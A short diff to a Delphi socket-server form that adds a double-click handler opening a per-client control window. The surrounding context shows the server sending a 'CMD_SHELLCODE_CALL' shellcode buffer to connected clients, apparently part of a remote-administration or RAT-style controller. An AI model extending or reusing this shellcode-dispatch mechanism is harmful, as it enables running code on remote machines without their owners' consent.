@@ -5,7 +5,7 @@ interface
 uses
   Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
   Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ExtCtrls, Vcl.ComCtrls,
-  System.Win.ScktComp, untClientObject, untCommands, untUtils;
+  System.Win.ScktComp, untClientObject, untCommands, untUtils, untControl;
 
 type
   TForm1 = class(TForm)
@@ -28,6 +28,7 @@ type
     procedure ServerSocket1Listen(Sender: TObject; Socket: TCustomWinSocket);
     procedure Button2Click(Sender: TObject);
     procedure Button3Click(Sender: TObject);
+    procedure ListView1DblClick(Sender: TObject);
   private
     { Private-Deklarationen }
   public
@@ -95,6 +96,21 @@ begin
       tempThread.SendBuffer(CMD_SHELLCODE_CALL,pShell,dwProcLen + SizeOf(TShellCode) - SizeOf(Pointer));
       FreeMem(pShell);
     end;
+  end;
+end;
+
+procedure TForm1.ListView1DblClick(Sender: TObject);
+var
+  tempThread:TClientThread;
+  tempFormControl:TForm3;
+begin
+  if listview1.Selected <> nil then
+  begin
+    tempThread := TClientThread(listview1.Selected.SubItems.Objects[0]);
+    tempFormControl := TForm3.Create(nil);
+    tempFormControl.Show;
+    tempFormControl.InitializeForm(tempThread);
+    tempThread.frmControl := tempFormControl;
   end;
 end;
 
